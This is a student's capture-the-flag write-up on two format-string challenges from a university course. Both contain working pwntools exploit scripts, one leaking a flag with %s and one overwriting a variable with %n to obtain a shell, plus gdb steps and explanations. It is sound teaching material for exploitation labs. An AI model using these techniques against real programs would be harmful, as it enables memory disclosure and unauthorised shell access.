# WEEK 7 (Format Strings) - Challenge 1

For this challenge we were provided with a compressed file that contained some python code called exploit_example.py that allowed us to send data to a process either locally or remotely. Furthermore we were given the source code of the program to exploit and the executable. To start this changelenge they gave us an hint to verify the security's that the program and we got this:

![Seguranças do programa](/images/securitys.png)

After that we discovered that the address are static because the PIE isn't activated making it alot easier to perform the exploit.
With this knowledge all that we add to do has to use gdb to analyse the program with this sequence of operations:

```bash
gdb program
b printf #(Breaking at printf because at the printf instruction the flag buffer is already initialized to the correct value of flag.txt)
run
p &flag #(Printing the address of the flag in the stack in our case 0x0804c060)
```

With the address all that was left to do was finding how many %x we would need to get to our first 4 bytes, to do that we tried a very simple input AAAA-%x-%x-%x, to our surprise the value already appeared at the first %x, so all that was left to do was to place the correct address instead of AAAA. To do that we modified the exploit_example.py to be able to send data not as simple as AAAA, because sending the correct address would be impossible through the standard input.

Code used:

```python
from pwn import *

LOCAL = True

if LOCAL:
    p = process("./program")
else:    
    p = remote("ctf-fsi.fe.up.pt", 4004)

N = 50
content = bytearray(0x0 for i in range(N))
number = 0x0804c060
content[0:4] = (number).to_bytes(4, byteorder='little')

s = "-%s"
fmt = (s).encode('latin-1')
content[4:4 + len(fmt)] = fmt

# Convert bytearray to string
payload = content.decode('latin-1')

p.recvuntil(b"got:")
p.sendline(payload)

p.interactive()
```


Output from the local program:
![Output local](/images/localFlag.png)

Output from the remote program:
![Output remoto](/images/serverFlag.png)

## Answers:
### What line of code is the vulnerability at?

The vulnerability is present at line 27 within the printf function. This vulnerability arises due to the omission of any string formatters, leaving only the buffer to be processed.

### What does the vulnerability allows you to do?

In this context, the vulnerability enables us to read an address of a string from the heap using the %s format specifier. By placing the pointer to that address in the stack, we gain the ability to read information from the heap. Additionally, it opens the possibility to write to an address in the stack.

### What functionallity allows you to obtain the flag?

As mentioned in the previous response, leveraging the %s format specifier is pivotal. This allows us to read a heap-allocated string, specifically the one containing the flag in this case. The exploitation of this functionality serves as the key method for obtaining the flag.

# WEEK 7 (Format Strings) - Challenge 2

In tackling this challenge, our objective was to identify the issue within the program. Just as in previous instances, we initiated the investigation by running the checksec, revealing similarities to our previous findings. Armed with this insight, we adhered to our proven methodology, employing gdb with the following sequential commands:

```bash
gdb program
b main
run
p &key #(Printing the address of the flag in the stack in our case 0x0804b324)
```

This time, our goal was to change the key to `0xbeef` in order to trigger a shell and subsequently read the server's flag. The process involved placing the address of the variable in the stack and utilizing the %n format specifier to alter its value. Given the limited buffer input, we had to employ precision formatting to pad a certain address with zeros. After calculating the necessary padding in the local environment, we devised the following exploit:

```python
from pwn import *

from pwn import *

LOCAL = True
if LOCAL:
    p = process("./program")
else:    
    p = remote("ctf-fsi.fe.up.pt", 4005)

# address  = 0x0804b324
# Wanted value - 48879

N = 50
content = bytearray(0x0 for i in range(N))
number = 0xaabbccdd
content[0:4] = (number).to_bytes(4, byteorder='little')
number = 0x0804b324
content[4:8] = (number).to_bytes(4, byteorder='little')

s = "%.48870x-%n"
fmt = (s).encode('latin-1')
content[8:8 + len(fmt)] = fmt

# Convert bytearray to string
payload = content.decode('latin-1')

p.recvuntil(b"here...")
p.sendline(payload)

p.interactive()
```

Output from the local program:
![Output local](/images/localBackDoor.png)

Output from the remote program:
![Output remoto](/images/flag2Remote.png)

## Answers:

### What is the line of code where the vulnerability is located? And what does the vulnerability allow one to do?

The vulnerability persists within the printf function, specifically on line 15. This is due to the absence of any string formatter, which results in unrestricted user input. This flaw enables the input of formatters such as %x, providing access to the values stored at addresses on the stack. Consequently, it grants read permissions to both the heap and stack, along with the ability to write on the stack.

### Is the flag loaded into memory? Or is there any functionality that we can leverage to access it?


In the scenario where the flag is not explicitly present in the program, but there exists a condition that grants access to a shell, triggering that condition is as simple as changing the value of the variable `key` to `0xbeef`.

### To unlock this functionality, what do you need to do?

To alter the value of the `key` variable, the process involves obtaining its address and strategically placing it on the stack. Subsequently, we utilize the `%n` specifier when reaching that position to modify its value. Since it's a specific value, careful calculation is required to determine the necessary padding for the process to succeed as we refered above.
